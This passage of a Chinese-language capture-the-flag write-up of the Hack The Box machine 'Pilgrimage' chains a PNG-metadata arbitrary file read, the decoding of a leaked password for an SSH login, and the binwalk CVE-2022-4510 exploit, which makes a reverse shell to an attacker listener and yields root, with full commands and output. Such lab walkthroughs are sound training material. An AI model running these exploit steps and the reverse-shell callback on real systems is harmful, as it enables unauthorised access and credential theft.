 |      19 | profile./etc/passwd            | 0x465bd758<br>   32174 | IEND  |       0 |                                | 0xae426082<br><br><span class="hljs-comment"># 将图像上传到易受攻击的服务来触发 PoC</span><br></code></pre></td></tr></table></figure><p><img src="/pic/c36564ed14b943bc83e72756949a032c_MD5.png"></p><p>将上面数据部分复制下来，通过 python 来解码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ python3 -c <span class="hljs-string">&#x27;print(bytes.fromhex(&quot;726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a&quot;).decode(&quot;utf-8&quot;))&#x27;</span><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>emily:x:1000:1000:emily,,,:/home/emily:/bin/bash<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>_laurel:x:998:998::/var/log/laurel:/bin/false<br></code></pre></td></tr></table></figure><p>验证成功，确实存在任意文件读取漏洞，尝试读取 shadow 文件，失败。尝试读取 login.php 中提到的数据库文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ pngcrush -text a <span class="hljs-string">&quot;profile&quot;</span> <span class="hljs-string">&quot;/var/db/pilgrimage&quot;</span> vjp.png<br>  Recompressing IDAT chunks <span class="hljs-keyword">in</span> vjp.png to pngout.png<br>   Total length of data found <span class="hljs-keyword">in</span> critical chunks            =      2206<br>   Best pngcrush method        =   4 (ws 15 fm 0 zl 9 zs 1) =      1201<br>CPU time decode 0.001379, encode 0.005750, other 0.000666, total 0.008438 sec<br><br>┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ exiv2 -pS pngout.png                            <br>STRUCTURE OF PNG FILE: pngout.png<br> address | chunk |  length | data                           | checksum<br>       8 | IHDR  |      13 | ............                   | 0xbeb798c5<br>      33 | pHYs  |       9 | .........                      | 0x009a9c18<br>      54 | tIME  |       7 | ......(                        | 0xc6655cae<br>      73 | tEXt  |      29 | Comment.Created with The GIMP  | 0xef64256e<br>     114 | IDAT  |    1144 | x..._lSU.....j<span class="hljs-string">&#x27;.....O......8P. | 0xfa9e0ce2</span><br><span class="hljs-string">    1270 | tEXt  |      26 | profile./var/db/pilgrimage     | 0x704d8d3d</span><br><span class="hljs-string">    1308 | IEND  |       0 |                                | 0xae426082</span><br></code></pre></td></tr></table></figure><p>遇到个问题，0 数据太多，那就将有意义的部分截取下来放入刚才的解码命令中，最后发现了一个和之前 git log 中显示的用户名相同的有效字符</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Pilgrimage]<br>└─$ python3 -c <span class="hljs-string">&#x27;print(bytes.fromhex(&quot;180103172d656d696c796162696763686f6e6b79626f693132330a000000010ff7000ff7&quot;))&#x27;</span><br>b<span class="hljs-string">&#x27;\x18\x01\x03\x17-emilyabigchonkyboi123\n\x00\x00\x00\x01\x0f\xf7\x00\x0f\xf7&#x27;</span><br></code></pre></td></tr></table></figure><p>尝试 ssh 登录，密码使用 <code>abigchonkyboi123</code> 和 <code>emilyabigchonkyboi123</code> 进行尝试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(pytool)─(i3eg1nner㉿minilite)-[~/tools/GitTools/Dumper/clone]<br>└─$ ssh emily@10.10.11.219<br>The authenticity of host <span class="hljs-string">&#x27;10.10.11.219 (10.10.11.219)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:uaiHXGDnyKgs1xFxqBduddalajktO+mnpNkqx/HjsBw.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>10.10.11.219<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">emily@10.10.11.219\&#x27;</span>s password:<br>Linux pilgrimage 5.10.0-23-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Sat Jul  8 16:07:48 2023 from 10.10.16.42<br>emily@pilgrimage:~$ <span class="hljs-built_in">whoami</span><br>emily<br>emily@pilgrimage:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 00:50:56:b9:e8:f2 brd ff:ff:ff:ff:ff:ff<br>    altname enp3s0<br>    altname ens160<br>    inet 10.10.11.219/23 brd 10.10.11.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>emily@pilgrimage:~$ <span class="hljs-built_in">id</span><br>uid=1000(emily) gid=1000(emily) <span class="hljs-built_in">groups</span>=1000(emily)<br>emily@pilgrimage:~$ <span class="hljs-built_in">uname</span> -a<br>Linux pilgrimage 5.10.0-23-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux</span><br>emily@pilgrimage:~$ <span class="hljs-built_in">ls</span> -liah<br>total 36K<br>30 drwxr-xr-x 4 emily emily 4.0K Jul  8 16:10 .<br>39 drwxr-xr-x 3 root  root  4.0K Jun  8 00:10 ..<br>43 lrwxrwxrwx 1 emily emily    9 Feb 10 13:42 .bash_history -&gt; /dev/null<br>35 -rw-r--r-- 1 emily emily  220 Feb 10 13:41 .bash_logout<br>33 -rw-r--r-- 1 emily emily 3.5K Feb 10 13:41 .bashrc<br>44 drwxr-xr-x 3 emily emily 4.0K Jun  8 00:10 .config<br>46 -rw-r--r-- 1 emily emily   44 Jun  1 19:15 .gitconfig<br>55 drwxr-xr-x 3 emily emily 4.0K Jun  8 00:10 .<span class="hljs-built_in">local</span><br>34 -rw-r--r-- 1 emily emily  807 Feb 10 13:41 .profile<br>49 -rw-r----- 1 root  emily   33 Jul  8 15:50 user.txt<br>emily@pilgrimage:~$ <span class="hljs-built_in">cat</span> user.txt<br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录成功，查看 <code>sudo -l</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~/.local/share/nano$ sudo -l<br>[sudo] password <span class="hljs-keyword">for</span> emily:<br>Sorry, user emily may not run sudo on pilgrimage.<br></code></pre></td></tr></table></figure><p>查看定时任务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># Example of job definition:</span><br><span class="hljs-comment"># .---------------- minute (0 - 59)</span><br><span class="hljs-comment"># |  .------------- hour (0 - 23)</span><br><span class="hljs-comment"># |  |  .---------- day of month (1 - 31)</span><br><span class="hljs-comment"># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</span><br><span class="hljs-comment"># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</span><br><span class="hljs-comment"># |  |  |  |  |</span><br><span class="hljs-comment"># *  *  *  *  * user-name command to be executed</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>查看可写文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~/.local/share/nano$ find / -<span class="hljs-built_in">type</span> d -writable 2&gt;/dev/null<br>/proc/2716/task/2716/fd<br>/proc/2716/fd<br>/proc/2716/map_files<br>/run/user/1000<br>/run/user/1000/gnupg<br>/run/user/1000/systemd<br>/run/user/1000/systemd/units<br>/run/user/1000/systemd/inaccessible<br>/run/lock<br>/var/www/pilgrimage.htb/shrunk<br>/var/www/pilgrimage.htb/tmp<br>/var/lib/php/sessions<br>/var/tmp<br>/home/emily<br>/home/emily/.local<br>/home/emily/.local/share<br>/home/emily/.local/share/nano<br>/home/emily/.config<br>/home/emily/.config/binwalk<br>/home/emily/.config/binwalk/plugins<br>/home/emily/.config/binwalk/modules<br>/home/emily/.config/binwalk/config<br>/home/emily/.config/binwalk/magic<br>/dev/mqueue<br>/dev/shm<br>/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service<br>/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/app.slice<br>/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/init.scope<br>/tmp<br>/tmp/.ICE-unix<br>/tmp/.X11-unix<br>/tmp/.font-unix<br>/tmp/.Test-unix<br>/tmp/.XIM-unix<br></code></pre></td></tr></table></figure><p>查看.config 文件，没有收获。看一看进程信息，发现有个 sh 脚本在跑，而且是 root 用户属主</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:~$ ps aux<br>USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND<br>root         746  0.0  0.0   6816  2352 ?        S    15:50   0:00 /bin/bash /usr/sbin/malwarescan.sh<br>emily@pilgrimage:~$ <span class="hljs-built_in">ls</span> -liah /usr/sbin/malwarescan.sh<br>31049 -rwxr--r-- 1 root root 474 Jun  1 19:14 /usr/sbin/malwarescan.sh<br>emily@pilgrimage:~$ <span class="hljs-built_in">cat</span> /usr/sbin/malwarescan.sh<br><span class="hljs-comment">#!/bin/bash</span><br><br>blacklist=(<span class="hljs-string">&quot;Executable script&quot;</span> <span class="hljs-string">&quot;Microsoft executable&quot;</span>)<br><br>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | <span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> FILE; <span class="hljs-keyword">do</span><br>        filename=<span class="hljs-string">&quot;/var/www/pilgrimage.htb/shrunk/<span class="hljs-subst">$(/usr/bin/echo <span class="hljs-string">&quot;<span class="hljs-variable">$FILE</span>&quot;</span> | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#x27;s/^.*CREATE //p&#x27;)</span>&quot;</span><br>        binout=<span class="hljs-string">&quot;<span class="hljs-subst">$(/usr/local/bin/binwalk -e <span class="hljs-string">&quot;<span class="hljs-variable">$filename</span>&quot;</span>)</span>&quot;</span><br>        <span class="hljs-keyword">for</span> banned <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;blacklist[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>                <span class="hljs-keyword">if</span> [[ <span class="hljs-string">&quot;<span class="hljs-variable">$binout</span>&quot;</span> == *<span class="hljs-string">&quot;<span class="hljs-variable">$banned</span>&quot;</span>* ]]; <span class="hljs-keyword">then</span><br>                        /usr/bin/rm <span class="hljs-string">&quot;<span class="hljs-variable">$filename</span>&quot;</span><br>                        <span class="hljs-built_in">break</span><br>                <span class="hljs-keyword">fi</span><br>        <span class="hljs-keyword">done</span><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>用 chatgpt 解释一下这个文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建一个名为 blacklist 的数组，包含两个字符串元素</span><br>blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用 inotifywait 监听 /var/www/pilgrimage.htb/shrunk/ 目录内的新文件，并使用 <span class="hljs-keyword">while</span> 循环逐行读取文件</span><br>/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">构建完整的文件路径，从 FILE 变量中提取最后一行，并去除开头的 <span class="hljs-string">&quot;CREATE &quot;</span> 字符串，拼接成文件路径</span><br>        filename=&quot;/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo &quot;$FILE&quot; | /usr/bin/tail -n 1 | /usr/bin/sed -n -e &#x27;s/^.*CREATE //p&#x27;)&quot;<br>        <br>        # 使用 binwalk 工具对指定的文件进行解析，将输出保存到 binout 变量<br>        binout=&quot;$(/usr/local/bin/binwalk -e &quot;$filename&quot;)&quot;<br>        <br>        # 遍历 blacklist 数组中的元素<br>        for banned in &quot;$&#123;blacklist[@]&#125;&quot;; do<br>        <br>        # 如果 binout 变量的内容包含 blacklist 数组中的元素<br>                if [[ &quot;$binout&quot; == *&quot;$banned&quot;* ]]; then<br>                <br>                # 使用 rm 命令删除对应的文件 break<br>                        /usr/bin/rm &quot;$filename&quot;<br>                        break<br>                fi<br>        done<br>done<br></code></pre></td></tr></table></figure><h3 id="binwalk-命令执行漏洞-root-脚本调用"><a href="#binwalk-命令执行漏洞-root-脚本调用" class="headerlink" title="binwalk 命令执行漏洞+root 脚本调用"></a>binwalk 命令执行漏洞+root 脚本调用</h3><p>既然使用了 binwalk 来对文件进行操作了，那就看一看 binwalk 是否存在漏洞，进而实现 root 执行的 sh 脚本调用 binwalk 反弹 shell 或提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[~/Downloads/Pilgrimage]<br>└─$ searchsploit binwalk<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br> Exploit Title                                                                                                                                                                                        |  Path<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>Binwalk v2.3.2 - Remote Command Execution (RCE)                                                                                                                                                       | python/remote/51249.py<br>------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------<br>Shellcodes: No Results<br>Papers: No Results<br><br></code></pre></td></tr></table></figure><p>有个代码执行的漏洞，看一看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;binwalk_exploit.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(data)<br>    f.write(header_pfs)<br>    f.write(content)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>)    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;You can now rename and share binwalk_exploit and start your local netcat listener.&quot;</span>)<br></code></pre></td></tr></table></figure><p>脚本的最后似乎是将反弹 shell 写入了 png 文件里，这正好符合我们的需求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:/tmp$ python3 51249.py vjp.png 10.10.14.145 443<br><br><span class="hljs-comment">################################################</span><br>------------------CVE-2022-4510----------------<br><span class="hljs-comment">################################################</span><br>--------Binwalk Remote Command Execution--------<br>------Binwalk 2.1.2b through 2.3.2 included-----<br>------------------------------------------------<br><span class="hljs-comment">################################################</span><br>----------Exploit by: Etienne Lacoche-----------<br>---------Contact Twitter: @electr0sm0g----------<br>------------------Discovered by:----------------<br>---------Q. Kaiser, ONEKEY Research Lab---------<br>---------Exploit tested on debian 11------------<br><span class="hljs-comment">################################################</span><br><br><br>You can now rename and share binwalk_exploit and start your <span class="hljs-built_in">local</span> netcat listener.<br><br>emily@pilgrimage:/tmp$ <span class="hljs-built_in">ls</span><br>51249.py  binwalk_exploit.png  systemd-private-e23853b016894d04af52d9c886a7a73b-systemd-logind.service-NPxI5h  systemd-private-e23853b016894d04af52d9c886a7a73b-systemd-timesyncd.service-2Jbd5e  vjp.png  vmware-root_609-3988556153<br></code></pre></td></tr></table></figure><p>文件夹下多了一个 binwalk_exploit.png，本机提前开启监听，将其复制到脚本持续扫描的目录中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">emily@pilgrimage:/tmp$ <span class="hljs-built_in">cp</span> binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/<br></code></pre></td></tr></table></figure><p>反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(i3eg1nner㉿minilite)-[/usr/share/wordlists]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [10.10.14.145] from (UNKNOWN) [10.10.11.219] 49676<br><span class="hljs-built_in">cd</span> /root<br><span class="hljs-built_in">ls</span><br>quarantine<br>reset.sh<br>root.txt<br><span class="hljs-built_in">cat</span> root.txt<br><br><span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br><span class="hljs-built_in">whoami</span><br>root<br><span class="hljs-built_in">uname</span> -a<br>Linux pilgrimage 5.10.0-23-amd64 <span class="hljs-comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64 GNU/Linux</span><br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 